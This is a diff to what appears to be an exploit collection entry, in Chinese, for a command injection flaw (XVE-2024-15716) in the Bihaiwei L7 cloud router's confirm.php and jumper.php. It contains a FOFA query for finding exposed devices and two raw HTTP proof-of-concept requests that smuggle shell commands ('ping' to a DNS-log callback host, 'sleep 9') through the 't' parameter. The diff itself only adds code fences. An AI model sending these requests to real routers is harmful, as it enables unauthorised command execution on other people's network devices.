@@ -81,6 +81,7 @@ FOFA：app="碧海威科技-L7云路由"
 
 POC/EXP1：
 
+```http
 GET /notice/confirm.php?t=;ping%204151.eyes.sh HTTP/1.1
 Host: 127.0.0.1:1443
 Accept: application/json, text/javascript, */*
@@ -88,6 +89,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
+```
+
 
 ![image-20240627161948437](./.resource/碧海威L7云路由无线运营版confirm.phpjumper.php命令注入漏洞XVE-2024-15716/media/image-20240627161948437.png)
 
@@ -97,6 +100,7 @@ Connection: close
 
 POC/EXP2：
 
+```http
 GET /notice/jumper.php?t=;sleep%209 HTTP/1.1
 Host: 127.0.0.1:1443
 Accept: application/json, text/javascript, */*
@@ -104,6 +108,8 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
+```
+
 
 ![image-20240627162233035](./.resource/碧海威L7云路由无线运营版confirm.phpjumper.php命令注入漏洞XVE-2024-15716/media/image-20240627162233035.png)
 
